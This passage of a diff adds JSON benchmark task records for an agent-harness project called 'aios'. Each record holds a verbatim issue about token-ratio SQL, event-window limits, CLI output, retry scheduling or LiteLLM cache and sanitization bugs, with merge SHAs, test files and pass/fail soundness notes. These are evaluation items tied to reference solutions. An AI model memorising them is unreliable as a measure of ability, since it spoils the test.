**-240 local tokens per 0.001 R-shift**. Per-turn R drift of 0.005 \u2192 **drop_local moves by ~1200 local tokens / 5-6 events every turn**. The oldest-kept event changes \u2192 prefix bytes change \u2192 Anthropic's prefix cache invalidates on the events section \u2192 rebuild from scratch.\n\nThis amplification scales linearly with \\`total_local\\` \u2014 so the longer a session lives, the worse the problem gets. It's structurally a property of long-running aios sessions combined with a continuously-updating R.\n\nDiagnosed in the smoke-test thread that also produced #163 / #164 / #165 / #166. See the \\\"R-jitter\\\" discussion there for the full derivation.\n\n## Why the current design has this problem\n\nThe sliding window's stated purpose is to *track* R over time \u2014 adapt to workload shifts. But R is really a *property of the model's tokenizer*, not a time-series. The tokenizer doesn't change turn-to-turn. What changes is the mix of content (messages vs tool schemas vs structured outputs), which affects per-span R but shouldn't affect the aggregate estimate of the underlying model parameter.\n\nThe 30-sample window re-estimates the parameter from scratch each turn, producing continuous drift even when nothing real has changed. And the drift is the fuel for the amplifier.\n\n## Proposed fix\n\n**Replace the sliding window with a lifetime aggregate, and quantize the result to a bucket proportional to standard error.** Principled framing: R is a fixed unknown parameter being estimated from noisy observations; the bucket is the confidence interval.\n\nConcretely:\n\n```python\nasync def model_token_ratio(conn, model, *, k_bucket: float = 2.0) -> float:\n    row = await conn.fetchrow(\\\"\\\"\\\"\n        SELECT COUNT(*)::bigint AS n,\n               COALESCE(SUM((data->'model_usage'->>'input_tokens')::bigint), 0)::bigint AS sum_a,\n               COALESCE(SUM((data->>'local_tokens')::bigint), 0)::bigint AS sum_l,\n               COALESCE(STDDEV((data->'model_usage'->>'input_tokens')::float /\n                               NULLIF((data->>'local_tokens')::bigint, 0)), 0)::float AS stddev_per_span\n        FROM events\n        WHERE kind = 'span'\n          AND data->>'event' = 'model_request_end'\n          AND (data->>'is_error')::boolean = false\n          AND data->>'model' = \\$1\n          AND (data->>'local_tokens')::bigint > 0\n    \\\"\\\"\\\", model)\n    if row[\\\"n\\\"] < 2 or row[\\\"sum_l\\\"] == 0:\n        return 1.0  # not enough data to calibrate\n    raw = row[\\\"sum_a\\\"] / row[\\\"sum_l\\\"]\n    se = row[\\\"stddev_per_span\\\"] / (row[\\\"n\\\"] ** 0.5)  # standard error of the mean\n    bucket = max(k_bucket * se, 0.001)  # floor prevents zero-bucket at huge N\n    return round(raw / bucket) * bucket\n```\n\nReplaces the current LIMIT-N sliding window + \\`n < 30 \u2192 1.0\\` fallback with a single formula. One DB query, stateless.\n\n## Why this works\n\n1. **Self-stabilizing at large N.** Each new sample moves the aggregate by \\`(sample - R\u0302) / N\\`. At N=1000 with per-sample spread \u03c3=0.01, that's ~1e-5 per sample. Multiplied by \\`drop_effective\\` sensitivity gives ~0.0024 local token shift per new sample \u2014 effectively zero. Even without bucketing, drop_local converges to a fixed value once N is large.\n\n2. **Smooth activation.** At small N, \\`SE = \u03c3/\u221aN\\` is large, so the bucket is wide. Effectively R quantizes to coarse values (or 1.0) when data is thin. As samples accumulate, the bucket narrows smoothly. No \\\"hard threshold\\\" cliff.\n\n3. **Principled bucket width.** \\`k \u00d7 SE\\` is the standard statistical \\\"are these estimates meaningfully different?\\\" threshold. Under this bucket, R only changes when the new estimate is statistically distinguishable from the stamped one.\n\n4. **No new state.** Stateless, like the current implementation. No sessions-table columns. No event stamping. No cross-entity coordination when agent config changes.\n\n## Migration\n\n- Unit tests in \\`tests/unit/test_model_token_ratio.py\\` need updates \u2014 the API signature changes (no more explicit \\`n\\` parameter) and the math is different.\n- E2E tests in \\`tests/e2e/test_model_token_ratio_sql.py\\` need updates \u2014 most of the \\\"sliding-window\\\" scenarios no longer apply; replace with \\\"converges to aggregate as N grows\\\" / \\\"bucket shrinks with N\\\" behaviors.\n- Existing \\`model_request_end\\` spans (from #161) remain valid \u2014 the query shape is the same, just aggregated differently.\n- No schema change, no migration needed.\n\n## Edge cases / future work\n\n- **Boundary flipping** at exact bucket edges: rare given monotonic-ish drift in most workloads; if observed in telemetry, consider hysteresis (asymmetric up/down thresholds).\n- **Regime shifts** (new model release, tokenizer change, etc.) \u2014 lifetime aggregate is slow to respond. Future: an explicit reset mechanism (\\`/agents/:id/calibration/reset\\`) that filters older calibration samples via a \\`calibration_epoch\\` field on the span or agent. Not in scope for this issue.\n- **Backtesting impact**: changes the per-turn drop_local computation, so sessions prior to this landing were using a jittery R. When #167's backtesting framework lands, both regimes can be replayed and compared head-to-head.\n\n## References\n\n- Current behavior set by #160 \u2192 #161 (design \u2192 impl)\n- Double-count fixed in #163\n- Threshold tweaked N=100 \u2192 N=30 in #164 (which is what activated the amplifier on JN's workload)\n- System+tools overhead added in #165\n- Tail-block overhead added in #166\n- Broader windowing design space: #167\n\n## Verification post-merge\n\nQuick sanity check: on a running session with many accumulated calibration samples, confirm \\`drop_local\\` is stable across consecutive \\`read_windowed_events\\` calls (no per-turn shift). Proxy logs should show \\`cache_read\\` jump from ~8K to ~(overhead + events)-size on the second turn after a snap, indicating the events section is now being cache-hit.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "2dff404b803e1a05fde809098c413337452f3455",
+   "merge_sha": "e625d11fab60b6ed84c5180c2777dff3704f8d61",
+   "src_files": [
+    "src/aios/db/queries.py"
+   ],
+   "test_files": [
+    "tests/unit/test_model_token_ratio.py",
+    "tests/unit/test_windowed_ratio.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 0.17s))"
+  },
+  {
+   "id": "s33",
+   "pr": 163,
+   "issue": 162,
+   "task": "model_token_ratio double-counts input_tokens: cache_read + cache_creation are subsets of input_tokens, not disjoint\n\n## Symptom\n\n`model_token_ratio` in `src/aios/db/queries.py` (introduced in #161) sums:\n\n```sql\nSUM(\n    (data->'model_usage'->>'input_tokens')::bigint\n    + COALESCE((data->'model_usage'->>'cache_read_input_tokens')::bigint, 0)\n    + COALESCE((data->'model_usage'->>'cache_creation_input_tokens')::bigint, 0)\n) AS total_actual\n```\n\nThe three fields are treated as disjoint. They aren't: LiteLLM normalizes Anthropic's usage so **`input_tokens` is already the full prompt count**, and `cache_read_input_tokens` / `cache_creation_input_tokens` are breakdowns *within* that total.\n\n## Evidence\n\nFrom three consecutive successful `model_request_end` spans on `sess_01KPCX6P484PAHSQ53AHBTB498`, Opus 4.7:\n\n| seq   | local_tokens | input_tokens | cache_read | cache_creation | cache_read + cache_creation |\n|-------|-------------:|-------------:|-----------:|---------------:|---------------------------:|\n| 10172 | 159,504      | 242,347      | 241,046    | 897            | 241,943                    |\n| 10153 | 158,891      | 241,477      | 8,102      | 232,944        | 241,046                    |\n| 10140 | 430,095      | 652,121      | 651,047    | 617            | 651,664                    |\n\nFor every row, `cache_read + cache_creation \u2248 input_tokens` (within ~500 tokens of uncached input). Confirms `input_tokens` is the total.\n\nResulting ratios:\n\n- True ratio (`input_tokens / local_tokens`): 1.519, 1.520, 1.516 \u2014 stable, matches measured Opus 1.517 from #160.\n- `model_token_ratio`'s ratio with double-count: 3.04, 3.04, 3.03 \u2014 roughly 2\u00d7 the true value.\n\n## Impact\n\nOnce N=100 samples accumulate for any given model (default `n` in `model_token_ratio`), `read_windowed_events` will multiply `cumulative_tokens` by ~3.04 instead of ~1.52 and decide the windowed total exceeds `window_max` at roughly half the real size. The windower will drop events ~2\u00d7 more aggressively than the operator asked for.\n\nConcrete projection on JN at current settings (`window_max=200k`, `window_min=100k`):\n- True ratio: window retains ~132k local \u2248 200k provider. Fits the configured budget.\n- Double-counted ratio: window retains ~66k local \u2248 100k provider. Cuts effective context in half.\n\nPrefix-cache stability is also degraded proportionally \u2014 each snap advances drop_local by `chunk / R_effective`, and a larger R_effective means more frequent snapping.\n\n## Root cause\n\nThe LiteLLM-vs-Anthropic-native convention mismatch isn't documented in-issue anywhere the author would have checked. Anthropic's raw API returns three disjoint fields (`input_tokens` is the *non-cached* portion), but LiteLLM's `model_usage` normalizes to the OpenAI-style convention where `input_tokens` is total. The `cache_*` fields are pass-through metrics, not an extension of the count.\n\n## Fix\n\nOne edit in `model_token_ratio`:\n\n```python\nSELECT\n    COUNT(*) AS k,\n    COALESCE(SUM((data->'model_usage'->>'input_tokens')::bigint), 0)::bigint AS total_actual,\n    COALESCE(SUM(lt), 0)::bigint AS total_local\nFROM recent\n```\n\ni.e., drop the two `+ COALESCE(cache_read_input_tokens...)` / `+ COALESCE(cache_creation_input_tokens...)` terms from the `total_actual` expression. `input_tokens` alone is the correct full-prompt count.\n\n## Testing\n\n- Re-derive the ratio against live data on `sess_01KPCX6P484PAHSQ53AHBTB498`: with the fix, R should land in 1.51-1.53 for the ~6 Opus samples accumulated since #161 shipped.\n- Existing unit tests in `tests/unit/test_model_token_ratio.py` continue to pass (they mock the aggregated row, not the SQL expression).\n- Worth adding a unit test that checks the SQL string for the presence of exactly one `input_tokens` extraction and zero `cache_read_input_tokens` / `cache_creation_input_tokens` extractions, as a regression fence.\n\n## Out of scope\n\nOther providers' usage shapes (OpenAI, OpenRouter, Gemini) are all documented as OpenAI-compatible `input_tokens = total`; the same fix is correct for all of them.\n\n## Urgency\n\nModerate. The bug is harmless until `N=100` samples accumulate for some model (the `model_token_ratio` below-N fallback returns 1.0). JN has ~4-5 Opus samples logged since #161 shipped. Fixing before N crosses 100 avoids a noticeable one-time cache invalidation when the broken ratio activates.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "3996ab49dbc4c575f73b5d7de6bea27924992f35",
+   "merge_sha": "9876ea1fd52a4e792ae0bd7c0082147394312846",
+   "src_files": [
+    "src/aios/db/queries.py"
+   ],
+   "test_files": [
+    "tests/unit/test_model_token_ratio.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 5 passed in 0.15s))"
+  },
+  {
+   "id": "s34",
+   "pr": 157,
+   "issue": 155,
+   "task": "_dispatch_confirmed_tools reads kind=lifecycle with default ASC+LIMIT 200 \u2014 drops recent tool_confirmed events on long sessions\n\n## Symptom\n\n`_dispatch_confirmed_tools` in `src/aios/harness/loop.py:683` reads lifecycle events with the default `LIMIT 200 ORDER BY seq ASC` to find `tool_confirmed` events that match the latest assistant message's `tool_calls`. On a session with more than 200 lifecycle events, the query returns the *oldest* 200 rows \u2014 overwhelmingly early `turn_ended` events \u2014 and misses any recent `tool_confirmed` entirely. Symptom: user clicks allow, nothing happens (the confirmed tool call gets filtered out of the `pending` list).\n\nThis is the same architectural defect as #154, at a different caller. Sibling bug surfaced during code review of the #154 fix.\n\n## Root cause\n\n```python\n# loop.py:683 (current)\nlifecycle_events = await sessions_service.read_events(\n    pool,\n    session_id,\n    kind=\"lifecycle\",\n)\nconfirmed: set[str] = set()\nfor e in lifecycle_events:\n    if e.data.get(\"event\") == \"tool_confirmed\" and e.data.get(\"result\") == \"allow\":\n        ...\n```\n\nDefault `LIMIT 200 ORDER BY seq ASC` returns the oldest rows. On any long-lived session, recent `tool_confirmed` events fall outside the window.\n\n## Shovel-ready fix\n\n#154 introduced a `newest_first: bool = False` parameter on `read_events` for exactly this pattern. This caller just needs:\n\n```python\nlifecycle_events = await sessions_service.read_events(\n    pool,\n    session_id,\n    kind=\"lifecycle\",\n    newest_first=True,\n    limit=<some_bound>,\n)\n```\n\nThe bound is the design question: unlike the retry counter, there is no small fixed budget. Options:\n- **`limit=200` newest-first** \u2014 cheapest; matches current window size but reads the *recent* 200 rather than the ancient 200. Good enough if we're confident no single assistant message issues >200 tool calls between its emission and the next dispatch sweep.\n- **Walk back in pages until all `asst_tool_calls[i].id` are resolved or no more lifecycle events exist** \u2014 precise, but adds paging logic.\n- **`limit=max(200, 4 * len(asst_tool_calls))`** \u2014 coarse heuristic; fine in practice since tool-call counts per assistant message are small.\n\nOption 1 is the minimal change and almost certainly sufficient.\n\n## Test\n\nAdd a unit test parallel to `test_count_consecutive_rescheduling_finds_tail_on_long_session` (see `tests/unit/test_loop_retry.py` after #154) \u2014 stub `read_events` with LIMIT+ORDER semantics, feed 300 early unrelated lifecycle events + a fresh `tool_confirmed allow` for the asst tool_call_id, assert the pending list includes it.\n\n## Impact\n\nAny long-lived session with always_ask tools will eventually hit a state where the user's confirmations are silently dropped \u2014 visible as \"I clicked allow, the tool didn't run, the model is stuck waiting.\" Worse user-facing symptom than #154's silent-retry-forever.\n\nFiled during code review of PR for #154 on 2026-04-23.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "eb2948c5f742d7e0349c1981acc746e267b70df8",
+   "merge_sha": "6d3de5f1eba66a005caa6ef406a24c61ca40fb45",
+   "src_files": [
+    "src/aios/harness/loop.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dispatch_confirmed_tools.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 2 passed in 0.93s))"
+  },
+  {
+   "id": "s35",
+   "pr": 136,
+   "issue": 134,
+   "task": "aios connections archive is silent on success (missed by #126 P3 scope)\n\n## Symptom\n\n`aios connections archive <id>` exits 0 and prints nothing on success \u2014 the same gap that #126 P3 fixed for nine other archive/delete commands. It was simply not in P3's enumeration list and PR #130 stayed inside the stated scope.\n\n```\n$ aios connections archive conn_01K...\n$\n```\n\n## Root cause\n\n`src/aios/cli/commands/connections.py:148-154`:\n\n```python\n@app.command(\"archive\", help=\"Archive a connection (soft-delete, retained for audit).\")\ndef archive(ctx: typer.Context, connection_id: str) -> None:\n    def _run() -> None:\n        client = just_client(ctx)\n        with client:\n            client.request(\"DELETE\", f\"/v1/connections/{connection_id}\")\n\n    run_or_die(_run)\n```\n\nThe server returns 204 (see `src/aios/api/routers/connections.py:78`), and the CLI never prints the `print_success` line that PR #130 added to its siblings.\n\n## Fix\n\nOne-line change: add `print_success(\"archived\", connection_id)` after the DELETE call, matching the pattern PR #130 established for `bindings archive`, `rules archive`, `agents delete`, etc.\n\n## Why file separately\n\nJust to keep the audit trail clean \u2014 PR #130 landed with a documented scope (\"nine commands listed in #126 P3\") and should not silently grow. Trivial follow-up.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "cdcbbf145c7758ba06a9fa65653435135767759d",
+   "merge_sha": "47d1465665cc02c3b09d4e5c469565a73cbcd431",
+   "src_files": [
+    "src/aios/cli/commands/connections.py"
+   ],
+   "test_files": [
+    "tests/unit/cli/test_cli_connections.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 7 passed in 0.17s))"
+  },
+  {
+   "id": "s36",
+   "pr": 85,
+   "issue": 80,
+   "task": "defer_retry_wake passes schedule_in as task kwarg instead of procrastinate directive (breaks exponential backoff from #71)\n\n## Observed\n\nAfter tonight's gpt-oss-20b context-overflow 400, the exponential-backoff retry path introduced in #71 fires but fails with:\n\n```\nTypeError: wake_session() got an unexpected keyword argument 'schedule_in'\nJob harness.wake_session[4512](cause='reschedule', session_id='sess_01KPCX...',\n    schedule_in={'seconds': 2}) ended with status: Error, lasted 0.001 s\n```\n\nEvery retry attempt (``[2, 8, 30, 120]`` delays) raises the same error, so no retry actually lands.  The session stays stuck until the periodic sweep eventually re-wakes it \u2014 which is exactly the ~30s floor #71 was supposed to fix.\n\n## Root cause\n\nIn ``src/aios/harness/wake.py::defer_retry_wake``:\n\n```python\nawait app.configure_task(\"harness.wake_session\").defer_async(\n    session_id=session_id,\n    cause=\"reschedule\",\n    schedule_in={\"seconds\": delay_seconds},  # \u2190 treated as a task kwarg\n)\n```\n\n``procrastinate.Task.defer_async(**kwargs)`` forwards ``kwargs`` to the task function.  So ``schedule_in={'seconds': ...}`` is being passed as an argument to ``wake_session(session_id, cause, ...)``, which doesn't accept it \u2014 hence the ``TypeError``.\n\nProcrastinate's delayed-scheduling API uses a different method on the configured task (something like ``.configure(schedule_in=timedelta(...))`` or a ``schedule_at`` parameter on a different chained call).  The correct invocation wasn't used.\n\n## Impact\n\n- #71 is effectively inert: every retry attempt errors out at defer time, so the retry never runs.\n- Recovery falls back to the periodic sweep \u2014 the exact ~30s floor #71 was meant to eliminate.\n- The ``schedule_in`` TypeError is a visible red flag in the worker log but the session still recovers, so it's easy to miss.\n\n## What a fix looks like (not prescribing)\n\n- Use the correct procrastinate method to schedule a delayed ``defer_async``.  Procrastinate's docs/source have the canonical call shape; ``schedule_in`` belongs on a scheduling directive, not in the task's ``**kwargs``.\n- Regression test: a unit or e2e test that calls ``defer_retry_wake`` and asserts the job lands in procrastinate's queue with a scheduled-for timestamp in the future (not that it errors out).\n\n## Related\n\n- #71 / #54 \u2014 the PR / issue this regressed from.  The backoff values (``[2, 8, 30, 120]``) and call-site in ``run_session_step`` are correct; only the procrastinate call inside ``defer_retry_wake`` is broken.\n\n## Priority\n\nMedium.  Not user-visible under the current behavior (session still recovers via sweep), but the whole point of #71 was faster recovery on transient errors \u2014 and that's currently dead code.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "82352a7983a8b7ce6ddec25554ae3c93473d6eaa",
+   "merge_sha": "63ff1e9b10a81d8f930251f0a424688ccdd7c54a",
+   "src_files": [
+    "src/aios/harness/wake.py"
+   ],
+   "test_files": [
+    "tests/unit/test_wake.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 2 passed in 0.13s))"
+  },
+  {
+   "id": "s37",
+   "pr": 64,
+   "issue": 51,
+   "task": "enable LiteLLM message_sanitization for cross-model replay on Anthropic\n\nReplaying a session through an Anthropic-routed model fails when the event log contains assistant messages with `content: \"\"` (emitted by some OpenRouter models like minimax/Gemma when the turn is tool-call-only). The Anthropic API rejects empty text content blocks:\n\n```\nlitellm.BadRequestError: AnthropicException: {\"type\":\"invalid_request_error\",\"message\":\"messages: text content blocks must be non-empty\"}\n```\n\nLiteLLM ships a built-in fix for exactly this case (and two related ones: orphaned tool_calls and orphaned tool_results): [message_sanitization](https://docs.litellm.ai/docs/completion/message_sanitization). Enable it by setting `litellm.modify_params = True` globally at module init, or `LITELLM_MODIFY_PARAMS=True` in the environment.\n\n**Scope**: enable `modify_params` in the harness completion module. No custom translation needed.\n\n**Test**: unit test that verifies a session with mixed OpenAI-format events (some with `content: \"\"` + `tool_calls`) can complete a step through `stream_litellm` against a mocked Anthropic-routed model without a BadRequestError.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "c5da55f1f0e6d75cbc699b259c972b49c6a97cf1",
+   "merge_sha": "93773bb4e94a47d40465f77d9c6cc09db97869cd",
+   "src_files": [
+    "src/aios/harness/completion.py"
+   ],
+   "test_files": [
+    "tests/unit/test_completion_sanitize.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 8 passed in 0.89s))"
+  },
+  {
+   "id": "s38",
+   "pr": 27,
+   "issue": 25,
+   "task": "bug: assistant messages with content:null and provider-specific fields break cross-model sessions\n\n## Summary\n\nWhen a session accumulates messages from multiple models (e.g., swapping from Anthropic to OpenRouter to MiniMax), provider-specific fields stored in assistant message events cause downstream providers to reject the entire conversation. Two specific issues:\n\n### 1. `content: null` stored verbatim\n\nSome LiteLLM providers (GPT-5.4-mini, Kimi K2.5) return assistant messages with `content: null` instead of `content: \"\"`. This gets stored as JSON null in the events table. When replayed to providers like MiniMax or Gemma via OpenRouter, they reject the request with \"Invalid control character\" or \"invalid_request\" errors.\n\nThis is the same class of issue as `tool_calls: null` (fixed in PR #15) \u2014 `_normalize_message()` should also handle null content.\n\n### 2. Provider-specific fields leak across models\n\nAnthropic models return `reasoning_content` on assistant messages. Kimi K2.5 returns `reasoning` and `reasoning_details`. These fields are stored verbatim in the event log and replayed to all subsequent models. Non-Anthropic providers on OpenRouter reject unknown fields.\n\n## Evidence\n\nA session that ran through Kimi K2.5 \u2192 Haiku \u2192 GPT-5.4-mini \u2192 MiniMax \u2192 Opus \u2192 GPT-OSS-20B accumulated both issues. Switching to Gemma 4 or MiniMax M2.7 on this session produced consistent failures:\n\n```\nOpenRouterException: \"Invalid control character at: line 1 column 4509 (char 4508)\"\n```\n\nPosition 4509 in the serialized request body corresponds to `\"content\": null` on an early assistant message.\n\nAdditionally, 12 assistant messages have `reasoning_content` from Opus, which would fail on any non-Anthropic provider.\n\n## Root cause\n\n`_normalize_message()` in `completion.py` strips `tool_calls: null` but doesn't handle:\n- `content: null` \u2192 should become `content: \"\"`\n- `reasoning_content`, `reasoning`, `reasoning_details` \u2192 provider-specific, should be stripped before storage or stripped at context-build time\n\n## Suggested approach\n\nTwo options for provider-specific fields:\n\n**Option A \u2014 Strip at storage time** (in `_normalize_message()`): Remove provider-specific fields before appending to the event log. Pro: clean log. Con: loses information that might be useful for observability.\n\n**Option B \u2014 Strip at context-build time** (in `build_messages()`): Keep everything in the log but filter out provider-specific fields when assembling the context for a different model. Pro: preserves observability data. Con: needs to know which fields are provider-specific.\n\nFor `content: null`, it should always be normalized to `\"\"` at storage time \u2014 there's no observability value in null vs empty string.\n\n## Reproduction\n\n1. Create a session with an Anthropic model (e.g., `anthropic/claude-haiku-4-5-20251001`)\n2. Send a few messages (tool calls will produce assistant messages with null content)\n3. Switch the agent to an OpenRouter model (e.g., `openrouter/minimax/minimax-m2.7`)\n4. Send a message \u2192 observe `invalid_request` error\n\nFor reasoning field leakage:\n1. Run a session on `anthropic/claude-opus-4-20250514` (produces `reasoning_content`)\n2. Switch to `openrouter/openai/gpt-5.4-mini`\n3. Send a message \u2192 observe provider rejection of unknown fields\n\n## Test models for validation\n\nThese models are known to be sensitive to malformed content (good for testing):\n- `openrouter/google/gemma-4-31b-it` \u2014 rejects `content: null`\n- `openrouter/google/gemma-4-26b-a4b-it` \u2014 rejects `content: null`\n- `openrouter/minimax/minimax-m2.7` \u2014 rejects unknown fields\n\nThese models produce the problematic fields (good for seeding):\n- `anthropic/claude-opus-4-20250514` \u2014 produces `reasoning_content`\n- `openrouter/moonshotai/kimi-k2.5` \u2014 produces `reasoning`, `reasoning_details`\n- `openrouter/openai/gpt-5.4-mini` \u2014 produces `content: null`",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "b6b31cb7242b3a6d4ea85bd73aa8ea762bf13b4b",
+   "merge_sha": "7270f1f66e53638b245bf97bdd4fcce6f0f5348e",
+   "src_files": [
+    "src/aios/harness/context.py"
+   ],
+   "test_files": [
+    "tests/unit/test_context.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "multi-attempt",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (6 failed, 36 passed in 0.10s))"
+  },
+  {
+   "id": "s39",
+   "pr": 19,
+   "issue": 18,
+   "task": "bug: cache breakpoints not reaching Anthropic through OpenRouter\n\n## Summary\n\nPR #16 added `inject_cache_breakpoints()` which places `cache_control: {\"type\": \"ephemeral\"}` at the **message level** (e.g., `messages[0][\"cache_control\"] = ...`). This doesn't produce any cache creation or cache reads when going through OpenRouter to Anthropic.\n\n## Evidence\n\nA fresh session on `openrouter/anthropic/claude-haiku-4-5` shows 0% cache hits and 0 cache_creation across 9 steps (up to ~2K tokens):\n\n```\nStep  1: input=  389  create=    0  read=    0  hit=0%\nStep  2: input=  476  create=    0  read=    0  hit=0%\n...\nStep  9: input= 1981  create=    0  read=    0  hit=0%\n```\n\n## What worked earlier\n\nA quick hack that placed `cache_control` inside **content blocks** produced 99% cache hits:\n\n```python\nmsg[\"content\"] = [\n    {\"type\": \"text\", \"text\": content, \"cache_control\": {\"type\": \"ephemeral\"}}\n]\n```\n\nThis is consistent with Anthropic's API spec, which expects `cache_control` on content blocks within messages, not at the message level.\n\n## Root cause\n\nLiteLLM's Anthropic transformation layer (`llms/anthropic/chat/transformation.py` lines 1144-1147) passes through `cache_control` from content blocks but may not map top-level message `cache_control` correctly \u2014 especially when routing through OpenRouter.\n\n## Suggested fix\n\n`inject_cache_breakpoints()` should wrap string content into content-block format when adding cache_control:\n\n```python\n# Instead of:\nmessages[0][\"cache_control\"] = _CACHE_CONTROL\n\n# Do:\ncontent = messages[0].get(\"content\")\nif isinstance(content, str):\n    messages[0][\"content\"] = [\n        {\"type\": \"text\", \"text\": content, \"cache_control\": _CACHE_CONTROL}\n    ]\nelif isinstance(content, list) and content:\n    content[-1][\"cache_control\"] = _CACHE_CONTROL\n```\n\nSame pattern for the last conversation message. Tool `cache_control` (top-level on the tool dict) may also need adjustment.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "f41e8435cdb359de5d912e42d2c287f6406c15ea",
+   "merge_sha": "6ae395321ed50dee5f68a2d639534f1132efe010",
+   "src_files": [
+    "src/aios/harness/completion.py"
+   ],
+   "test_files": [
+    "tests/unit/test_usage.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (8 failed, 10 passed in 0.98s))"
+  }
+ ]
+}
